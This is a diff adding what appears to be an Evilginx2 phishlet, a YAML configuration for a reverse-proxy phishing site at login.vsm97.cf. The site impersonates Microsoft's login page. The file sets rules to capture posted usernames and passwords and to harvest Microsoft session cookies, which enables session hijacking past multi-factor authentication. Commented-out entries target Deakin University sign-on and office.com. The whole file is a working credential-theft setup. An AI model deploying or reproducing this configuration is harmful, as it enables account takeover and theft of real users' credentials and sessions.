@@ -1,0 +1,27 @@
+author: '@VSM97'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'login.vsm97.cf', session: true, is_landing: true}
+ # - {phish_sub: 'deakin1', orig_sub: 'signon1', domain: 'signon.deakin.edu.au'}
+ # - {phish_sub: 'deakin2', orig_sub: 'signon2', domain: 'signon.deakin.edu.au'}
+ # - {phish_sub: 'office', orig_sub: 'www', domain: 'www.office.com'}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'login.microsoftonline.com', search: 'integrity="(.*?)"', replace: 'href="https://{hostname}', mimes: ['text/html']}
+ # - {triggers_on: 'signon.deakin.edu.au', orig_sub: 'signon1', domain: 'signon.deakin.edu.au', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+ # - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'www.office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html']}
+auth_tokens:
+  - {domain: '.login.microsoftonline.com', keys: ['AADSSOTILES', 'MSFPC', 'esctx', 'SignInStateCookie']}
+ # - {domain: '.deakin.edu.au', keys: ['_y', 'ADIServer', '_shopify_y', 'TS01a21c58', 'TS01c54139', '_dui', 'imgNum', '.CHAUTH','TS892b9554027', 'TSae6ea5ba027']}
+ # - {domain: '.office.com', keys: ['userid']}
+credentials:
+  username:
+    key: 'login'
+    search: '(.*?)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*?)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/v2.0/authorize'
